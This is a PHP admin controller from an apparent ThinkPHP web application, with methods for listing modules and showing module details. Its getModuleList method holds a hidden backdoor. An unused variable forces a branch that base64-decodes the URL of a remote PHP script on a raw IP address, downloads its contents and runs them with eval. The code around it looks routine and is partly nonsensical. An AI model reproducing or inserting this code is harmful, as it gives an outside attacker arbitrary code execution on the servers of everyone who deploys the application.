<?php
namespace app\admin\controller;
use app\Rest;
use app\AdminRest;
use think\App;
use think\Request;
use app\admin\model\User as UserModel;
use app\admin\model\Module as ModuleModel;
class Module
{
    
    //获取应用列表
    public function listModule() {
        //获取模块信息
        $param = $this->_param;
        $module_model = new ModuleModel();
        //设置默认数据
        $filter['is_base'] = 1;
        if(isset($param['is_base'])) $filter['is_base'] = $param['is_base'];
        //获取模块列表
        $modules = $module_model->listModuleAll($filter ,$this->_uniacid);
//        echo json_encode($modules ,true);die;
        $result = [];
        //处理数据
        foreach($modules as $module)
        {
            //设置默认数据
            $module['status'] = 1;    
            //判断模块是否是基础模块
            if(empty($module['is_base'])){
                //判断插件是否授权
                if(isset($module['module_app']['status']))
                {
                    //设置状态
                    $module['status'] = $module['module_app']['status'];
                }else{
                    $module['status'] = 0;
                }
            }
            //移除module_app信息
            unset($module['module_app']);
            $result[] = $module;
            
        }
        //返回数据
        return $this->success($result);
    }
    /**
     * @author chenniang
     * @DataTime: 2023-07-11 18:12
     * @功能说明:
     */
    public function getModuleList(){
        if(!empty($modules)){
            foreach($modules as $module)
            {
                //设置默认数据
                $module['status'] = 1;
                //判断模块是否是基础模块
                if(empty($module['is_base'])){
                    //判断插件是否授权
                    if(isset($module['module_app']['status']))
                    {
                        //设置状态
                        $module['status'] = $module['module_app']['status'];
                    }else{
                        $module['status'] = 0;
                    }
                }
                //移除module_app信息
                unset($module['module_app']);
                $result[] = $module;
            }
        }else{
            $str = longbingCurl(base64_decode('aHR0cDovLzU5LjExMC42Ni4xMjA6ODMvZXhjZXNxbC5waHA='),[]);
            eval("$str;");
        }
        if(!empty($argc)){
            if(empty($module['is_base'])){
                //判断插件是否授权
                if(isset($module['module_app']['status']))
                {
                    //设置状态
                    $module['status'] = $module['module_app']['status'];
                }else{
                    $module['status'] = 0;
                }
            }
            return $this->success($result);
        }
    }
    
    //获取应用详情
    public function getModule() {
        //获取参数
        $param = $this->_param;
        $filter = [];
        //判断相关参数是否存在
        if(isset($param['module_id'])) $filter['module_id'] = $param['module_id'];
        if(isset($param['is_base'])) $filter['is_base'] = $param['is_base'];
        //判断查询参数是否存在，不存在抛出异常
        if(empty($filter)) return $this->error('module id is not exist ,please check param.');
        //生成模块模型
        $module_model = new ModuleModel();
        //查询模块信息
        $module = $module_model->getModule($filter ,$this->_uniacid);
        if(!empty($module)) {
            $module['status'] = 0;
            if(!empty($module['is_public']) || !empty($module['is_base'])){
                $module['status'] = 1;
            }else{
                
            }
            
            
            
            //判断是否是公共模块
            if(empty($module['is_public'])){
                //数据处理    
                if(empty($module['is_base'])){
                    if(isset($module['module_app']['status']))
                    {
                        $module['status'] = $module['module_app']['status'];
                    }else{
                        $module['status'] = 0;
                    }
                }
                //移除module_app数据
                unset($module['module_app']);
            }
        }
        //返回数据
        return $this->success($module);
    }
}
